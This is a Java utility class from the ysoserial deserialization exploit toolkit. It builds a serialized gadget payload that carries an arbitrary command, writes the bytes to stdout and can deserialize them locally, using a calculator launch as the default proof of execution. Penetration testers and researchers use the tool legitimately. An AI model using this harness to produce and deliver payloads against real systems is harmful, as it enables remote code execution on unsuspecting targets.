package ysoserial.payloads.util;

import java.io.File;
import java.util.concurrent.Callable;
import ysoserial.Deserializer;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.secmgr.ExecCheckingSecurityManager;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {

    public static boolean runDeserialize = false;

    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args)
        throws Exception {
        // ensure payload generation doesn't throw an exception
        byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>() {
            public byte[] call() throws Exception {
                final String[] command = args;
                ObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(command);
                byte[] ser = objBefore instanceof byte[] ? (byte[]) objBefore : Serializer.serialize(objBefore);
                Utils.releasePayload(payload, objBefore);
                return ser;
            }
        });

        System.out.write(serialized);

        if (runDeserialize) {
            try {
                final Object objAfter = Deserializer.deserialize(serialized);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    private static String getDefaultTestCmd() {
        return getFirstExistingFile(
            "C:\\Windows\\System32\\calc.exe",
            "/Applications/Calculator.app/Contents/MacOS/Calculator",
            "/usr/bin/gnome-calculator",
            "/usr/bin/kcalc"
        );
    }

    private static String getFirstExistingFile(String... files) {
//        return "calc.exe";
        for (String path : files) {
            if (new File(path).exists()) {
                return path;
            }
        }
        throw new UnsupportedOperationException("no known test executable");
    }
}
